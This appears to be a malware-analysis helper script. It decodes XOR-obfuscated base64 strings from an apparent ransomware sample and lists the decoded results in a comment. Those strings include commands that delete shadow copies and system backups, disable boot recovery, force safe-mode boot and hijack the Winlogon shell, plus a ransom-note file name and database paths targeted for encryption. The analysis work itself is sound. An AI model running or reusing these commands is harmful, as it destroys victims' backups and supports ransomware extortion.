import base64
import struct

arr_b64_enc_bytes = ["FAAJGxgGFQoTAh4kNSA0ICk7ExgeISsgODQTBDo1NSohOxkqNTQeICETFyAjHiQeKjQTFC40Oyoi",
"CiEmJSMqAx4hHCorBCAhISokOx4gITQ=",
"CiEmJSMqAxoG",
"BCAhNCohOxc1ICI3OwUqHyY5HiA1BisiHiE=",
"FA4UGwoCCxX+GQo=",
"FxUACBUGAgn+AwoUXy9veV4=",
"GhQKFRcVAAn+Awo=",
"FzUgKDUmIgsmOyY=",
"FzUgKDUmImcJHiMqNA==",
"BgMDGhQKFRQXFQAJ/gMK",
"Bjc3CyY7Jg==",
"FxoFA/4E",
"GyA1ZwU1IDg0KjU=",
"AhQABCYkHyo=",
"ExgeISsgODQ=",
"Exc1ICg1JiJnCR4jKjQ=",
"Exo0KjU0EwYjI2caNCo1NA==",
"EwY3NwsmOyY=",
"EwIeJDUgNCApOxMYHiErIDg0",
"OCIeJGcU/wYLABgEABcOZwsKAwobCmdgISAeITsqNSYkOx45Kg==",
"OCUmKyIeIWcLCgMKGwpnFA4UGwoCFBsGGwoFBgT8Ghc=",
"OCUmKyIeIWcLCgMKGwpnFA4UGwoCFBsGGwoFBgT8GhdnYisqIyo7KgAjKyo0Ow==",
"OCUmKyIeIWcLCgMKGwpnFA4UGwoCFBsGGwoFBgT8GhdnYhwqKjcZKjU0HiAhNG13",
"OTQ0JisiHiFnCyojKjsqZxQfJisgODRnYAYjI2dgFjoeKjs=",
"JSQrKiseO2dgNCo7ZywrKikmOiM7Mmc1KiQgOSo1LiohJiUjKitnASA=",
"JSQrKiseO2dgNCo7ZywrKikmOiM7MmclICA7NDsmOzo0NyAjHiQuZx4oISA1KiYjIykmHiM6NSo0",
"YTkfKw==",
"YTkfKy8=",
"NyA4KjU0HyojI2cLHjQiIDohO2ILHjQc/iImKCpnYv4iJigqFyY7H2c=",
"NyA4KjU0HyojI2EqLyo=",
"EDUqJisiKhBhOy87",
"/wACCgsV/hkK",
"/wACChcGG/8=",
"Cyo0HDsgNxM=",
"BCAhOzUgI2cXJiEqIxMLKjQcOyA3",
"GCYjIxcmNyo1",
"LCweKzIy",
"LCwqLzsyMg==",
"OjcrJjsq",
"CCMgJSYjEywGb3l5eW8GdGJvCXV3Ynt2CXRibngLdmJ5eHkFdQYLeQYLCXgy",
"Exc1ICg1JiJnCR4jKjQTAh4kNSA0ICk7EwovJB8mISgqZxQqNTkqNQ==",
"Exc1ICg1JiJnCR4jKjRnXy9veV4TAh4kNSA0ICk7EwovJB8mISgqZxQqNTkqNQ==",
"Exc1ICg1JiJnCR4jKjQTAh4kNSA0ICk7ZxQWA2cUKjU5KjU=",
"Exc1ICg1JiJnCR4jKjRnXy9veV4TAh4kNSA0ICk7ZxQWA2cUKjU5KjU=",
"Exc1ICg1JiJnCR4jKjQTIi40NiM=",
"Exc1ICg1JiJnCR4jKjRnXy9veV4TIi40NiM=",
"FQAAGxME/gIZdQ==",
"FAoDCgQbZ11nCRUAAmcYHiF0dRAXKjUpCSA1IiY7OyorCyY7JhAXKjUpFzUgJBAXNSAkKjQ0",
"ASYiKg==",
"/gsXNSAkKjQ0",
"Fyo1JCohOxc1ICQqNDQgNRseIio=",
"NDkkHyA0Ow==",
"JDQ1NDQ=",
"NCo1OR4kKjQ=",
"IzQmNDQ=",
"OB4hIyAoICE=",
"NDcgICM0OQ==",
"Ki83IyA1KjU=",
"FTohOx4iKgU1IBwqNQ==",
"FC40Oyoi",
"NyA4KjU0HyojIw==",
"ODQkNR43Ow==",
"BDUqJjsq",
"GB4hdHUQFzUgJCo0NA==",
"BCAiIiYhKwMeISo=",
"YjQmKSo=",
"FAAJGxgGFQoTAh4kNSA0ICk7ExgeISsgODRnARsTBDo1NSohOxkqNTQeICETGB4hIyAoICE=",
"Ki83IyA1KjVhKi8qYw==",
"FB8qIyM=",
"JSQrKiseO2dgNCo7ZzQmKSolICA7ZyEqOzggNRw=",
"JSQrKiseO2dgKyojKjsqOSYjOipnNCYpKiUgIDs="]

for b64_enc_bytes in arr_b64_enc_bytes:
	b64_dec_bytes = base64.b64decode(b64_enc_bytes)
	dec_str = ""

	for b64_dec_byte in b64_dec_bytes:
		if ((b64_dec_byte ^ 2) + 4) ^ 73 > 0xff:
			dec_str += chr(struct.pack("i", ((b64_dec_byte ^ 2) + 4) ^ 73)[0])
		else:
			dec_str += chr(((b64_dec_byte ^ 2) + 4) ^ 73)

	print(f"{b64_enc_bytes}: {dec_str}")

'''
FAAJGxgGFQoTAh4kNSA0ICk7ExgeISsgODQTBDo1NSohOxkqNTQeICETFyAjHiQeKjQTFC40Oyoi: SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
CiEmJSMqAx4hHCorBCAhISokOx4gITQ=: EnableLinkedConnections
CiEmJSMqAxoG: EnableLUA
BCAhNCohOxc1ICI3OwUqHyY5HiA1BisiHiE=: ConsentPromptBehaviorAdmin
FA4UGwoCCxX+GQo=: SYSTEMDRIVE
FxUACBUGAgn+AwoUXy9veV4=: PROGRAMFILES(x86)
GhQKFRcVAAn+Awo=: USERPROFILE
FzUgKDUmIgsmOyY=: ProgramData
FzUgKDUmImcJHiMqNA==: Program Files
BgMDGhQKFRQXFQAJ/gMK: ALLUSERSPROFILE
Bjc3CyY7Jg==: AppData
FxoFA/4E: PUBLIC
GyA1ZwU1IDg0KjU=: Tor Browser
AhQABCYkHyo=: MSOCache
ExgeISsgODQ=: \Windows
Exc1ICg1JiJnCR4jKjQ=: \Program Files
Exo0KjU0EwYjI2caNCo1NA==: \Users\All Users
EwY3NwsmOyY=: \AppData
EwIeJDUgNCApOxMYHiErIDg0: \Microsoft\Windows
OCIeJGcU/wYLABgEABcOZwsKAwobCmdgISAeITsqNSYkOx45Kg==: wmic SHADOWCOPY DELETE /nointeractive
OCUmKyIeIWcLCgMKGwpnFA4UGwoCFBsGGwoFBgT8Ghc=: wbadmin DELETE SYSTEMSTATEBACKUP
OCUmKyIeIWcLCgMKGwpnFA4UGwoCFBsGGwoFBgT8GhdnYisqIyo7KgAjKyo0Ow==: wbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest
OCUmKyIeIWcLCgMKGwpnFA4UGwoCFBsGGwoFBgT8GhdnYhwqKjcZKjU0HiAhNG13: wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0
OTQ0JisiHiFnCyojKjsqZxQfJisgODRnYAYjI2dgFjoeKjs=: vssadmin Delete Shadows /All /Quiet
JSQrKiseO2dgNCo7ZywrKikmOiM7Mmc1KiQgOSo1LiohJiUjKitnASA=: bcdedit /set {default} recoveryenabled No
JSQrKiseO2dgNCo7ZywrKikmOiM7MmclICA7NDsmOzo0NyAjHiQuZx4oISA1KiYjIykmHiM6NSo0: bcdedit /set {default} bootstatuspolicy ignoreallfailures
YTkfKw==: .vhd
YTkfKy8=: .vhdx
NyA4KjU0HyojI2cLHjQiIDohO2ILHjQc/iImKCpnYv4iJigqFyY7H2c=: powershell Dismount-DiskImage -ImagePath
NyA4KjU0HyojI2EqLyo=: powershell.exe
EDUqJisiKhBhOy87: _readme_.txt
/wACCgsV/hkK: HOMEDRIVE
/wACChcGG/8=: HOMEPATH
Cyo0HDsgNxM=: Desktop\
BCAhOzUgI2cXJiEqIxMLKjQcOyA3: Control Panel\Desktop
GCYjIxcmNyo1: WallPaper
LCweKzIy: {{id}}
LCwqLzsyMg==: {{ext}}
OjcrJjsq: update
CCMgJSYjEywGb3l5eW8GdGJvCXV3Ynt2CXRibngLdmJ5eHkFdQYLeQYLCXgy: Global\{A86668A3-8F20-41F3-97D1-676B2AD6ADF7}
Exc1ICg1JiJnCR4jKjQTAh4kNSA0ICk7EwovJB8mISgqZxQqNTkqNQ==: \Program Files\Microsoft\Exchange Server
Exc1ICg1JiJnCR4jKjRnXy9veV4TAh4kNSA0ICk7EwovJB8mISgqZxQqNTkqNQ==: \Program Files (x86)\Microsoft\Exchange Server
Exc1ICg1JiJnCR4jKjQTAh4kNSA0ICk7ZxQWA2cUKjU5KjU=: \Program Files\Microsoft SQL Server
Exc1ICg1JiJnCR4jKjRnXy9veV4TAh4kNSA0ICk7ZxQWA2cUKjU5KjU=: \Program Files (x86)\Microsoft SQL Server
Exc1ICg1JiJnCR4jKjQTIi40NiM=: \Program Files\mysql
Exc1ICg1JiJnCR4jKjRnXy9veV4TIi40NiM=: \Program Files (x86)\mysql
FQAAGxME/gIZdQ==: ROOT\CIMV2
FAoDCgQbZ11nCRUAAmcYHiF0dRAXKjUpCSA1IiY7OyorCyY7JhAXKjUpFzUgJBAXNSAkKjQ0: SELECT * FROM Win32_PerfFormattedData_PerfProc_Process
ASYiKg==: Name
/gsXNSAkKjQ0: IDProcess
Fyo1JCohOxc1ICQqNDQgNRseIio=: PercentProcessorTime
NDkkHyA0Ow==: svchost
JDQ1NDQ=: csrss
NCo1OR4kKjQ=: services
IzQmNDQ=: lsass
OB4hIyAoICE=: winlogon
NDcgICM0OQ==: spoolsv
Ki83IyA1KjU=: explorer
FTohOx4iKgU1IBwqNQ==: RuntimeBroker
FC40Oyoi: System
NyA4KjU0HyojIw==: powershell
ODQkNR43Ow==: wscript
BDUqJjsq: Create
GB4hdHUQFzUgJCo0NA==: Win32_Process
BCAiIiYhKwMeISo=: CommandLine
YjQmKSo=: -safe
FAAJGxgGFQoTAh4kNSA0ICk7ExgeISsgODRnARsTBDo1NSohOxkqNTQeICETGB4hIyAoICE=: SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
Ki83IyA1KjVhKi8qYw==: explorer.exe,
FB8qIyM=: Shell
JSQrKiseO2dgNCo7ZzQmKSolICA7ZyEqOzggNRw=: bcdedit /set safeboot network
JSQrKiseO2dgKyojKjsqOSYjOipnNCYpKiUgIDs=: bcdedit /deletevalue safeboot
'''